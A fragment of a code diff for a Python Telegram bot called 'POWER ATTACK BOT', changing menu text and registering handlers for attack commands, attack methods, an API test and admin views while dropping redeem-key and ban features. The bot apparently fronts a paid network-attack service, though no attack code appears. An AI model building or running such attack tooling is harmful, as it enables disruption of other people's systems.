         [InlineKeyboardButton("👤 MY INFO", callback_data="info")],
         [InlineKeyboardButton("📊 STATS", callback_data="stats")]
@@ -671,15 +690,14 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
     
     await query.edit_message_text(
-        "⚡ *POWER ATTACK BOT*\n\n"
-        "Select an option:",
+        "⚡ *POWER ATTACK BOT*\n\nSelect option:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
-    await update.message.reply_text("✅ All operations cancelled!")
+    await update.message.reply_text("✅ Cancelled!")
 
 # ===== RUN BOT =====
 def run_bot():
@@ -691,30 +709,23 @@ def run_bot():
     # Command handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("attack", attack_command))
+    app.add_handler(CommandHandler("testapi", test_api_command))
     app.add_handler(CommandHandler("cancel", cancel))
     
     # Callback handlers
     app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
     app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
+    app.add_handler(CallbackQueryHandler(test_api_callback, pattern="^test_api$"))
     app.add_handler(CallbackQueryHandler(active_callback, pattern="^active$"))
-    app.add_handler(CallbackQueryHandler(redeem_callback, pattern="^redeem$"))
     app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
     app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
     app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
-    app.add_handler(CallbackQueryHandler(admin_gen, pattern="^admin_gen$"))
-    app.add_handler(CallbackQueryHandler(admin_list, pattern="^admin_list$"))
+    app.add_handler(CallbackQueryHandler(admin_logs, pattern="^admin_logs$"))
     app.add_handler(CallbackQueryHandler(admin_active, pattern="^admin_active$"))
-    app.add_handler(CallbackQueryHandler(admin_ban, pattern="^admin_ban$"))
-    app.add_handler(CallbackQueryHandler(admin_unban, pattern="^admin_unban$"))
-    app.add_handler(CallbackQueryHandler(admin_broadcast, pattern="^admin_broadcast$"))
     app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
     
     # Message handlers
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_redeem))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_ban))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_unban))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_broadcast))
     
     loop.run_until_complete(app.initialize())
     loop.run_until_complete(app.start())
